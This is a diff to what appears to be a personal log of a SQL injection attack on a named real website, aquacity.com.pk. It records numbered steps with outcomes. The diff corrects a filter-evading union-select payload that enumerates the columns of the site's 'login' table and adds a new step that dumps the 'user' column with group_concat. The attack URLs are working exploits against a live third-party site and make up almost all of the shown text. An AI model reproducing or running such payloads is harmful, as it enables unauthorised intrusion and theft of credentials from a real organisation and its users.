@@ -54,6 +54,9 @@ https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2
 outcome : saw a section called login, going for the view
 
 #### Step 10 : selected the login
-https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,column_name%20/*!12312from*/%20/*!information_schema.tables*/%20/*!12312where*/%20/*!12312table_name*/%20=%20%27login%27%20--+
+https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,column_name%20/*!12312from*/%20/*!information_schema.columns*/%20/*!12312where*/%20/*!12312table_name*/%20=%20%27login%27%20--+
 
 outcome : "user"
+
+#### Step 11 : exploiting the user "column"
+https://aquacity.com.pk/page.php?id=6%27/*!12345union*/%20/*!00000select*/%201,2,/*!12312group_concat(user)%20*/%20/*!12312from*/%20login%20--+
